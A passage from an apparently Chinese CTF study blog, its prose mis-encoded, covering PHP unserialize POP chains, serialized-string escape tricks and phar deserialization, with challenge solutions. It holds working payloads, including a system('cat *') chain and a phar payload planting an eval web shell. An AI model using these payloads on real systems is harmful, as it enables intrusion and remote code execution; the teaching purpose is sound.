'.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n} \n\n\npaylodï¼š\n$s=new Show(); //åˆ›å»ºshowå¯¹è±¡\n$s->source=new Show();  //å°†sourceå±æ€§èµ‹ä¸ºä¸€ä¸ªæ–°çš„showå¯¹è±¡ï¼Œè§¦å‘tostringå‡½æ•°\n$s->source->str=new Test();\t //ç»™$a->source->stråˆ›å»ºtestå¯¹è±¡ï¼Œåˆ™$a->source->str->sourceå±æ€§ä¸å­˜åœ¨ï¼Œæ‰§è¡Œ__getå‡½æ•°\n$s->source->str->p=new Modifier();//å°†Modifierå¯¹è±¡èµ‹ç»™på±æ€§ï¼Œä¸€ä¸ªé“¾å­å°±æ­¤å®Œæˆã€‚\necho urlencode(serialize($s));\n```\n\n## [2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›]ezpop\n\n```php\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n$a=new fin();\n$a->f1=new what();\n$a->f1->a=new mix();\n$a->f1->a->m1=new crow();\n$a->f1->a->m1->v1=new fin();\n$a->f1->a->m1->v1->f1=new mix();\n$a->f1->a->m1->v1->f1->m1='?><?php system(\"cat *\")?>';//è¿™é¢˜å¤ªç‹—äº†ï¼ŒæŠŠflagæ”¾åœ¨æ³¨é‡Šé‡Œï¼Œè¿˜å¾—cat *æ‰èƒ½çœ‹åˆ°ã€‚\necho serialize($a);\n```\n\n## PHPçš„å­—ç¬¦ä¸²é€ƒé€¸\n\nå­—ç¬¦ä¸²é€ƒé€¸å°±æ˜¯é€šè¿‡æ”¹å˜å­—ç¬¦ä¸²çš„é•¿åº¦æ¥æ”¹å˜é”®å€¼å¯¹ï¼Œè®©é”®å€¼å¯¹æ”¹å˜æˆæˆ‘ä»¬æƒ³è¦çš„æ ·å­ï¼Œè¿™ä¸ªå°±è·Ÿphpçš„ç‰¹æ€§æœ‰å…³äº†\n\n### PHPçš„ç‰¹æ€§\n\n#### 1ã€åºåˆ—åŒ–åï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ } ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œæ‰€ä»¥}åœ¨åé¢çš„æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„\n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\n?>\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}\nProcess finished with exit code 0\næ­¤æ—¶ï¼Œå¦‚æœå˜æˆO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}54656156135\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}54656156135'));\n{\n  [\"a\"]=>\n  string(1) \"a\"\n  [\"b\"]=>\n  string(1) \"b\"\n}\nä¸æ¯«æ²¡æœ‰å½±å“æ­£å¸¸çš„ååºåˆ—åŒ–\n```\n\n#### 2ã€å½“åºåˆ—åŒ–çš„é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™\n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:2:\"a\";s:1:\"b\";s:1:\"b\";}54656156135'));\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}bool(false)\n\nProcess finished with exit code 0\nå¯ä»¥çœ‹åˆ°ï¼Œè¿”å›falseï¼Œå°±æ˜¯æ— æ³•æ­£å¸¸ååºåˆ—åŒ–\n```\n\n#### 3ã€å¯ä»¥ååºåˆ—åŒ–ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´ \n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"c\";s:1:\"c\";}'));\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}object(s)#2 (3) {\n  [\"a\"]=>\n  string(1) \"a\"\n  [\"b\"]=>\n  NULL\n  [\"c\"]=>\n  string(1) \"c\"\n}\nçœ‹åˆ°ç±»é‡Œé¢å¹¶æ²¡æœ‰cï¼Œä½†æ˜¯èƒ½æ­£å¸¸ååºåˆ—åŒ–\n```\n\n### PHPå­—ç¬¦ä¸²é€ƒé€¸\n\nå­—ç¬¦ä¸²é€ƒé€¸ä¸€èˆ¬æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯å­—ç¬¦ä¸²å¢å¤šï¼Œä¸€ç§æ˜¯å­—ç¬¦ä¸²å‡å°‘\n\nå­—ç¬¦ä¸²é€ƒé€¸çš„æœ¬è´¨ä¹Ÿæ˜¯å·®ä¸å¤šå°±æ˜¯é—­åˆï¼Œæœ‰ä¸€ç§æ³¨å…¥çš„æ„Ÿè§‰\n\n#### å¢å¤šçš„æƒ…å†µ\n\n```php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\nclass s{\n    public $a;\n    public $b='666';\n    public function __construct($a){\n        $this->a = $a;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n$a =new s(\"bad\");\necho serialize($a);\n//echo waf(serialize($a));\n?>\n//O:1:\"s\":2:{s:1:\"a\";s:3:\"bad\";s:1:\"b\";s:3:\"666\";}è¿™æ˜¯æ²¡æœ‰ç»è¿‡æ›¿æ¢çš„\n//O:1:\"s\":2:{s:1:\"a\";s:3:\"good\";s:1:\"b\";s:3:\"666\";}è¿™æ˜¯ç»è¿‡æ›¿æ¢æ‰çš„\næ˜æ˜¾æ¯æ›¿æ¢ä¸€ä¸ªï¼Œå­—ç¬¦ä¸²é•¿åº¦å°±ä¼š+1ï¼Œé‚£æˆ‘ä»¬ç°åœ¨ä¸åƒè®©bä¸º666ï¼Œæƒ³è®©å®ƒæ˜¯888ï¼Œä½†æ˜¯bæ˜¯ä¸å¯æ§çš„ï¼Œæ€ä¹ˆåŠï¼Œé‚£å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸äº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é€ƒé€¸å­—ç¬¦ä¸²çš„é•¿åº¦\";s:1:\"b\";s:3:\"888\";}ï¼Œ21ä¸ªï¼Œé•¿åº¦ä¸º21.\né‚£å°±æ˜¯21ä¸ªbadå°±èƒ½è®©\";s:1:\"b\";s:3:\"666\";}é€ƒé€¸ï¼Œå³\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\nclass s{\n    public $a;\n    public $b='666';\n    public function __construct($a){\n        $this->a = $a;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n$a =new s('badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:1:\"b\";s:3:\"888\";}');\n//echo serialize($a);\necho (waf(serialize($a)));\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:84:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:1:\"b\";s:3:\"888\";}\";s:1:\"b\";s:3:\"666\";}'));\n//for($i=0;$i<21;$i++){\n//  echo 'bad';\n//}\n?>\nè¿è¡Œç»“æœï¼š\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:84:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:1:\"b\";s:3:\"888\";}\";s:1:\"b\";s:3:\"666\";}object(s)#2 (2) {\n  [\"a\"]=>\n  string(84) \"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\"\n  [\"b\"]=>\n  string(3) \"888\"\n}\n888666\nå¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸæ›¿æ¢ã€‚\n```\n\n#### å‡å°‘çš„æƒ…å†µ\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"good\",\"hao\",$str);\n}\nclass s{\n    public $a;\n    public $b;\n    public function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n//è¿™ä¸ªæ˜¯æ¯æ›¿æ¢ä¸€ä¸ªå°±ä¼šå‡å°‘ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦è®©å‰é¢çš„åæ‰åé¢çš„ï¼Œå†é€šè¿‡ä¿®æ”¹$bæ¥å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œè®©å‰é¢åæ‰\";s:1:\"b\";s:21:ï¼Œæ¥å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œè¿™ä¸ªåŸç†ä¸å¢åŠ ç›¸ä¼¼ï¼Œåè¿‡æ¥å°±è¡Œã€‚\n$a =new s('goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood','\";s:1:\"b\";s:3:\"888\";}');\n//echo serialize($a);\n//echo (waf(serialize($a)));\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:64:\"haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao\";s:1:\"b\";s:21:\"\";s:1:\"b\";s:3:\"888\";}\";}\";s:1:\"b\";s:3:\"888\";}'));\n//for($i=0;$i<17;$i++){\n//  echo 'good';\n//}\n?>\nè¿è¡Œç»“æœï¼š\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nobject(s)#2 (2) {\n  [\"a\"]=>\n  string(64) \"haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao\";s:1:\"b\";s:21:\"\"\n  [\"b\"]=>\n  string(3) \"888\"\n}\n888\";s:1:\"b\";s:3:\"888\";}\nProcess finished with exit code 0\næˆåŠŸæ›¿æ¢ã€‚\n```\n\n### ç¤ºä¾‹\n\n### å°è¯•ç‰›åˆ€-----[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒï¼ˆå¢ï¼‰\n\n```php\n <?php\nhighlight_file(__FILE__);s\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); \n\nå¯ä»¥çœ‹åˆ°ï¼Œæ¯å°†ä¸€ä¸ªbadæ›¿æ¢æˆä¸€ä¸ªgoodï¼Œå­—ç¬¦ä¸²é•¿åº¦+1ï¼Œkeyæ˜¯å¯æ§çš„\nO:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:6:\"whoami\";}è¿™æ˜¯ä¼ å…¥ä¸€ä¸ªbadçš„åºåˆ—åŒ–çš„å†…å®¹ï¼Œç°åœ¨æˆ‘ä»¬ä¸æƒ³æ‰§è¡Œwhoamiè¿™ä¸ªå‘½ä»¤ï¼Œå°±è¦æŠŠ;s:3:\"cmd\";s:6:\"whoami\";}ç»™é¡¶å‡ºå»ã€‚\nç›®çš„å­—ç¬¦ä¸²ï¼šO:7:\"GetFlag\":2ï¼š{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:2:\"ls\";}\";s:3:\"cmd\";s:6:\"whoami\";}\n\";s:3:\"cmd\";s:2:\"ls\";}æœ‰22ä¸ªå­—ç¬¦ï¼Œç„¶åæŠŠ22ä¸ªbadæ›¿æ¢æ‰åï¼Œå°±æ˜¯å¢åŠ äº†22ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆlså°±å¯ä»¥æ‰§è¡Œ\nå½“å‰ç›®å½•ä¸‹æ²¡æœ‰ï¼Œç›´æ¥æŸ¥æ ¹ç›®å½•ï¼ŒåŸç†ä¸€æ ·\n?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:7:\"cat /f*\";}\n```\n\n## pharååºåˆ—åŒ–\n\n#### ä»€ä¹ˆæ˜¯pharæ–‡ä»¶\n\npharæ–‡ä»¶å°±æ˜¯ç±»ä¼¼äºjavaçš„jarçš„é‚£ç§ç±»å‹çš„å‹ç¼©æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªphpæ–‡ä»¶çš„ä»£ç å‹ç¼©æˆä¸€ä¸ªpharï¼Œæ— éœ€è§£å‹ï¼ŒPHPå°±å¯ä»¥è¿›è¡Œè®¿é—®å¹¶æ‰§è¡Œå†…éƒ¨è¯­å¥ã€‚\n\n#### pharæ–‡ä»¶ç»“æ„\n\n```php\n1. stub //pharæ–‡ä»¶å¤´\n    pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºpharçš„æ–‡ä»¶å¤´\n    è¿™ä¸ªStubå…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„PHPæ–‡ä»¶ï¼Œå¿…é¡»æ˜¯ xxx<?php xxx; __HALT_COMPILER();?> è¿™ç§æ ¼å¼ï¼Œå¿…é¡»æœ‰__HALT_COMPILER()ï¼Œæ²¡æœ‰è¿™ä¸ªï¼ŒPHPå°±æ— æ³•è¯†åˆ«å‡ºå®ƒæ˜¯Pharæ–‡ä»¶ã€‚å…¶ä»–çš„æ— æ‰€è°“ã€‚\n2. manifest //å‹ç¼©æ–‡ä»¶çš„ä¿¡æ¯\n    pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™ä¸ªmeta-dataå°±æ˜¯ç”¨æˆ·è‡ªå·±å®šä¹‰çš„å…ƒæ•°æ®ï¼Œåœ¨è¿™é‡Œç”¨æˆ·è‡ªå®šä¹‰çš„å…ƒæ•°æ®å°±æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨çš„ï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚å¦‚ä¸‹å›¾ã€‚\n```\n\n![image-20240716105756715](C:\\Users\\æ¨æ²›æ¬£\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240716105756715.png)\n\n```php\n3. content //å‹ç¼©æ–‡ä»¶çš„å†…å®¹\n    è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹\n4. signature (å¯ç©º) //ç­¾å\n    ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚\n```\n\n#### pharååºåˆ—åŒ–\n\nPharä¹‹æ‰€ä»¥èƒ½ååºåˆ—åŒ–ï¼Œæ˜¯å› ä¸ºPharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„`meta-data`,PHPä½¿ç”¨`phar_parse_metadata`åœ¨è§£æmetaæ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨`php_var_unserialize`è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚\n\n#### åˆ©ç”¨æ¡ä»¶\n\n```\n1ã€pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨\n2ã€è¦æœ‰å¯æ§çš„å‚æ•°ï¼Œåƒå…ƒæ•°æ®é‚£ç§ï¼Œå¹¶ä¸”ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤\n3ã€php.iniä¸­çš„phar.readonlyé€‰é¡¹ï¼Œéœ€è¦ä¸ºOffï¼ˆé»˜è®¤æ˜¯onï¼‰ã€‚\n```\n\n#### ç”Ÿæˆpharæ–‡ä»¶\n\n```php\n<?php \nclass Flag{\n    public $cmd=\"qwq\";\n    function __destruct()\n    {\n        echo `cmd`;\n    }\n}\n\n$a = new Flag(); //åˆ›å»ºä¸€ä¸ªflagçš„å¯¹è±¡\n$phar = new Phar('A.phar'); //åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œè¿™ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Phar å¯¹è±¡ã€‚Phar æ˜¯ PHP ä¸­ç”¨äºåˆ›å»ºå’Œæ“ä½œ PHP å½’æ¡£æ–‡ä»¶ï¼ˆPHAR æ–‡ä»¶ï¼‰çš„ä¸€ä¸ªç±»ã€‚\n//åŠŸèƒ½ï¼šnew Phar(\"phar.phar\")  æ–‡ä»¶ååç¼€å¿…é¡»æ˜¯phar\n//å‚æ•°ï¼š\"phar.phar\" æ˜¯æ­£åœ¨åˆ›å»ºæˆ–æ‰“å¼€çš„ PHAR æ–‡ä»¶çš„åç§°ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚\n$phar->startBuffering(); //å¼€å¯ç¼“å­˜ï¼Œåœ¨ Phar å¯¹è±¡ä¸Šè°ƒç”¨ startBuffering() æ–¹æ³•å¯ä»¥ç¡®ä¿æ‰€æœ‰çš„æ›´æ”¹åœ¨å®é™…å†™å…¥æ–‡ä»¶ä¹‹å‰éƒ½ä¼šå…ˆè¢«ç¼“å†²ã€‚è¿™æ„å‘³ç€åœ¨ stopBuffering() ä¹‹å‰çš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè€Œæ˜¯æš‚æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚\n$phar->addFromString('test.txt','test'); //å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚addFromString æ–¹æ³•ç”¨äºä»å­—ç¬¦ä¸²å†…å®¹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚\"test.txt\" æ˜¯æ–‡ä»¶åï¼Œ\"test\" æ˜¯æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸€è¡Œä»£ç å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º test.txt çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹è®¾ç½®ä¸º \"test\"ã€‚å¦‚æœä½ ä¸éœ€è¦å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä»»ä½•æ–‡ä»¶ï¼Œè¿™ä¸€è¡Œä»£ç å¯ä»¥çœç•¥ã€‚\n$phar->setStub('<?php __HALT_COMPILER(); ? >'); //è¿™ä¸€è¡Œä»£ç è®¾ç½®äº† PHAR æ–‡ä»¶çš„å­˜æ ¹ï¼ˆstubï¼‰ã€‚setStub æ–¹æ³•ç”¨äºå®šä¹‰ PHAR æ–‡ä»¶çš„å…¥å£ä»£ç ã€‚\"<?php __HALT_COMPILER(); ?>\" æ˜¯ä¸€ä¸ª PHP æŒ‡ä»¤ï¼Œè¡¨ç¤ºåœæ­¢ç¼–è¯‘å™¨ã€‚æ­¤ä»£ç åœ¨ PHAR æ–‡ä»¶æ‰§è¡Œæ—¶é¦–å…ˆè¿è¡Œã€‚æœ‰æ—¶å€™ä¼šæœ‰æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå¦‚æœæœ‰æ–‡ä»¶å¤´æ£€æµ‹å¯ä»¥åŠ ä¸Šæ–‡ä»¶å¤´\n$phar->setMetadata($a);//è®¾ç½®å…ƒæ•°æ®ï¼ŒsetMetadata æ–¹æ³•ç”¨äºç»™ PHAR æ–‡ä»¶æ·»åŠ å…ƒæ•°æ®ã€‚è¿™é‡Œå°† TestObject å¯¹è±¡ $a ä½œä¸ºå…ƒæ•°æ®æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚\n//è‡ªåŠ¨è®¡ç®—ç­¾å\n$phar->stopBuffering(); //è¿™ä¸€è¡Œä»£ç åœæ­¢ç¼“å†²æ“ä½œå¹¶å°†æ‰€æœ‰ç¼“å†²çš„æ›´æ”¹å†™å…¥ PHAR æ–‡ä»¶ã€‚stopBuffering æ–¹æ³•ä¼šå°†ä¹‹å‰ç¼“å†²çš„æ‰€æœ‰æ›´æ”¹å®é™…å†™å…¥åˆ° PHAR æ–‡ä»¶ä¸­ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚\n```\n\nä¸è¿‡å¦‚æœphp.iniçš„phar.readonlyå¤„äºonçŠ¶æ€çš„è¯ï¼Œæ˜¯ä¸å…è®¸ç”Ÿæˆpharæ–‡ä»¶çš„ï¼Œcmdæ‰§è¡Œphp --iniï¼Œå°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªphp.iniçš„æ–‡ä»¶è·¯å¾„ï¼Œå°†php.inié‡Œé¢çš„`phar.readonly`é€‰é¡¹è®¾ç½®ä¸º`Off`ã€‚`å¹¶æŠŠåˆ†å·å»æ‰ã€‚`\n\n### ç¤ºä¾‹\n\n### å°è¯•ç‰›åˆ€-----[NewStarCTF 2023 å…¬å¼€èµ›é“]PharOne\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407160957424.png)\n\næŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼Œ/class.php\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161000091.png)\n\nè®¿é—®çœ‹åˆ°\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n@unlink($_POST['file']); \n```\n\né‚£æˆ‘ä»¬å°±è”æƒ³åˆ°äº†ï¼Œä¸Šä¼ pharæ–‡ä»¶ï¼Œpharåè®®è¾“å‡ºï¼Œè¿›è¡Œååºåˆ—åŒ–\n\n```php\n<?php\nclass Flag{\npublic $cmd;\npublic function __construct() {\n$this->cmd = \"echo '<?=eval(\\$_GET[1]);?>'>/var/www/html/1.php\";\n}\n\n}\n\n$a = new Flag(); //åˆ›å»ºä¸€ä¸ªflagçš„å¯¹è±¡\n$phar = new Phar('A.phar'); //åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œè¿™ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Phar å¯¹è±¡ã€‚Phar æ˜¯ PHP ä¸­ç”¨äºåˆ›å»ºå’Œæ“ä½œ PHP å½’æ¡£æ–‡ä»¶ï¼ˆPHAR æ–‡ä»¶ï¼‰çš„ä¸€ä¸ªç±»ã€‚\n//åŠŸèƒ½ï¼šnew Phar(\"phar.phar\")  æ–‡ä»¶ååç¼€å¿…é¡»æ˜¯phar\n//å‚æ•°ï¼š\"phar.phar\" æ˜¯æ­£åœ¨åˆ›å»ºæˆ–æ‰“å¼€çš„ PHAR æ–‡ä»¶çš„åç§°ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚\n$phar->startBuffering(); //å¼€å¯ç¼“å­˜ï¼Œåœ¨ Phar å¯¹è±¡ä¸Šè°ƒç”¨ startBuffering() æ–¹æ³•å¯ä»¥ç¡®ä¿æ‰€æœ‰çš„æ›´æ”¹åœ¨å®é™…å†™å…¥æ–‡ä»¶ä¹‹å‰éƒ½ä¼šå…ˆè¢«ç¼“å†²ã€‚è¿™æ„å‘³ç€åœ¨ stopBuffering() ä¹‹å‰çš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè€Œæ˜¯æš‚æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚\n$phar->addFromString('test.txt','test'); //å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚addFromString æ–¹æ³•ç”¨äºä»å­—ç¬¦ä¸²å†…å®¹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚\"test.txt\" æ˜¯æ–‡ä»¶åï¼Œ\"test\" æ˜¯æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸€è¡Œä»£ç å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º test.txt çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹è®¾ç½®ä¸º \"test\"ã€‚å¦‚æœä½ ä¸éœ€è¦å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä»»ä½•æ–‡ä»¶ï¼Œè¿™ä¸€è¡Œä»£ç å¯ä»¥çœç•¥ã€‚\n$phar->setStub('<?php __HALT_COMPILER(); ? >'); //è¿™ä¸€è¡Œä»£ç è®¾ç½®äº† PHAR æ–‡ä»¶çš„å­˜æ ¹ï¼ˆstubï¼‰ã€‚setStub æ–¹æ³•ç”¨äºå®šä¹‰ PHAR æ–‡ä»¶çš„å…¥å£ä»£ç ã€‚\"<?php __HALT_COMPILER(); ?>\" æ˜¯ä¸€ä¸ª PHP æŒ‡ä»¤ï¼Œè¡¨ç¤ºåœæ­¢ç¼–è¯‘å™¨ã€‚æ­¤ä»£ç åœ¨ PHAR æ–‡ä»¶æ‰§è¡Œæ—¶é¦–å…ˆè¿è¡Œã€‚æœ‰æ—¶å€™ä¼šæœ‰æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå¦‚æœæœ‰æ–‡ä»¶å¤´æ£€æµ‹å¯ä»¥åŠ ä¸Šæ–‡ä»¶å¤´\n$phar->setMetadata($a);//è®¾ç½®å…ƒæ•°æ®ï¼ŒsetMetadata æ–¹æ³•ç”¨äºç»™ PHAR æ–‡ä»¶æ·»åŠ å…ƒæ•°æ®ã€‚è¿™é‡Œå°† TestObject å¯¹è±¡ $a ä½œä¸ºå…ƒæ•°æ®æ·»åŠ åˆ° PHAR 